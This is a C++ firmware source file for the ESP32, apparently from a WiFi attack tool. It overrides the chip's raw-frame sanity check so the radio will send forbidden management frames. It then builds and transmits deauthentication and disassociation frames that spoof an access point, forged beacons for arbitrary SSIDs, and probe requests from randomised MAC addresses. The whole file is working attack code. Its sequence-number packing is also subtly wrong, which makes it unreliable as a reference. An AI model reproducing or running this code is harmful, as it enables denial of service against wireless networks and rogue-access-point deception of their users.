// WSL Bypasser - Bypass ESP32 WiFi frame validation for raw TX
// Based on ESP32 Marauder's approach using -zmuldefs linker flag
// 
// The ESP32 WiFi library checks ieee80211_raw_frame_sanity_check() before
// transmitting raw frames. By defining our own version and using -zmuldefs,
// our function takes precedence over the library version.

#include "wsl_bypasser.h"
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_random.h>

extern "C" {

// Override the sanity check function
// With -zmuldefs linker flag, this definition takes precedence over libnet80211.a
// This allows deauth (0xC0), disassoc (0xA0), and auth frames to be transmitted
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    // Always return 0 (success) - allow all frame types
    return 0;
}

}

namespace WSLBypasser {

bool initialized = false;

void init() {
    if (initialized) return;
    
    // Log that bypass is active
    Serial.println("[WSL] Frame validation bypass active (-zmuldefs)");
    initialized = true;
}

void randomizeMAC() {
    uint8_t mac[6];
    
    // Generate random MAC using hardware RNG
    esp_fill_random(mac, 6);
    
    // Set locally administered bit (bit 1 of first byte) and clear multicast bit (bit 0)
    // This marks it as a valid unicast locally-administered address
    mac[0] = (mac[0] & 0xFC) | 0x02;
    
    // Apply the new MAC address
    esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, mac);
    
    if (result == ESP_OK) {
        Serial.printf("[WSL] MAC randomized: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        Serial.printf("[WSL] MAC randomization failed: %d\n", result);
    }
}

bool sendDeauthFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    // Ensure we're on the right channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Deauth frame (26 bytes)
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth (subtype 0x0C)
        0x00, 0x00,  // Duration
        // Addr1 (DA - destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Addr2 (SA - source, spoofed as BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Addr3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Sequence control
        0x00, 0x00,
        // Reason code (2 bytes, little endian)
        0x07, 0x00   // Class 3 frame received from non-associated station
    };
    
    // Set addresses
    memcpy(deauthPacket + 4, staMac, 6);   // Destination
    memcpy(deauthPacket + 10, bssid, 6);   // Source (AP)
    memcpy(deauthPacket + 16, bssid, 6);   // BSSID
    deauthPacket[24] = reason;             // Reason code
    
    // Try to send
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    return (result == ESP_OK);
}

bool sendDisassocFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Disassoc frame (26 bytes) - same structure as deauth
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (subtype 0x0A)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code: Disassociated because station leaving
    };
    
    memcpy(disassocPacket + 4, staMac, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    return (result == ESP_OK);
}

// ---- Attack-extras frame builders (mirrored in test/mocks/testable_functions.h) ----

static uint16_t beaconSeq = 0;  // shared seq counter for spoofed mgmt frames
static const uint8_t kRatesIE[10] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
};

// Spoofed beacon: broadcast DA, SSID/bssid/channel fully caller-controlled.
static size_t buildBeaconFrame(uint8_t* out, size_t cap, const char* ssid,
                               uint8_t ssidLen, const uint8_t bssid[6],
                               uint8_t channel, uint16_t seq) {
    const size_t need = 24 /*hdr*/ + 12 /*fixed*/ + 2 + ssidLen +
                        3 /*DS*/ + sizeof(kRatesIE);
    if (!out || cap < need || ssidLen > 32) return 0;

    size_t n = 0;
    out[n++] = 0x80; out[n++] = 0x00;      // FC: beacon
    out[n++] = 0x00; out[n++] = 0x00;      // duration
    memset(out + n, 0xFF, 6); n += 6;      // DA broadcast
    memcpy(out + n, bssid, 6); n += 6;     // SA = spoofed AP
    memcpy(out + n, bssid, 6); n += 6;     // BSSID
    out[n++] = (uint8_t)((seq & 0x0F));         // seq-ctl low: seq bits 3:0,
    out[n++] = (uint8_t)((seq >> 4) & 0xFF);    // fragment nibble stays zero
    memset(out + n, 0x00, 8); n += 8;      // timestamp
    out[n++] = 0x64; out[n++] = 0x00;      // beacon interval 100 TU
    out[n++] = 0x21; out[n++] = 0x00;      // capability: ESS
    out[n++] = 0x00; out[n++] = ssidLen;   // SSID IE
    memcpy(out + n, ssid, ssidLen); n += ssidLen;
    out[n++] = 0x03; out[n++] = 0x01; out[n++] = channel;  // DS param
    memcpy(out + n, kRatesIE, sizeof(kRatesIE)); n += sizeof(kRatesIE);
    return n;
}

// Broadcast probe request looking for the given SSID.
static size_t buildProbeReqFrame(uint8_t* out, size_t cap, const char* ssid,
                                 uint8_t ssidLen, const uint8_t src[6],
                                 uint16_t seq) {
    const size_t need = 24 /*hdr*/ + 2 + ssidLen + sizeof(kRatesIE);
    if (!out || cap < need || ssidLen > 32) return 0;

    size_t n = 0;
    out[n++] = 0x40; out[n++] = 0x00;      // FC: probe request
    out[n++] = 0x00; out[n++] = 0x00;
    memset(out + n, 0xFF, 6); n += 6;      // DA broadcast
    memcpy(out + n, src, 6); n += 6;       // SA
    memset(out + n, 0xFF, 6); n += 6;      // BSSID wildcard
    out[n++] = (uint8_t)((seq & 0x0F));
    out[n++] = (uint8_t)((seq >> 4) & 0xFF);
    out[n++] = 0x00; out[n++] = ssidLen;
    memcpy(out + n, ssid, ssidLen); n += ssidLen;
    memcpy(out + n, kRatesIE, sizeof(kRatesIE)); n += sizeof(kRatesIE);
    return n;
}

bool sendBeaconFrame(const char* ssid, uint8_t ssidLen,
                     const uint8_t bssid[6], uint8_t channel) {
    uint8_t frame[128];
    size_t n = buildBeaconFrame(frame, sizeof(frame), ssid, ssidLen, bssid,
                                channel, beaconSeq++);
    if (n == 0) return false;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false);
    return (result == ESP_OK);
}

bool sendProbeReqFrame(const char* ssid, uint8_t ssidLen, uint8_t channel) {
    uint8_t src[6];
    esp_fill_random(src, 6);
    src[0] = (src[0] & 0xFC) | 0x02;  // locally administered unicast
    uint8_t frame[128];
    size_t n = buildProbeReqFrame(frame, sizeof(frame), ssid, ssidLen, src,
                                  beaconSeq++);
    if (n == 0) return false;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false);
    return (result == ESP_OK);
}

}
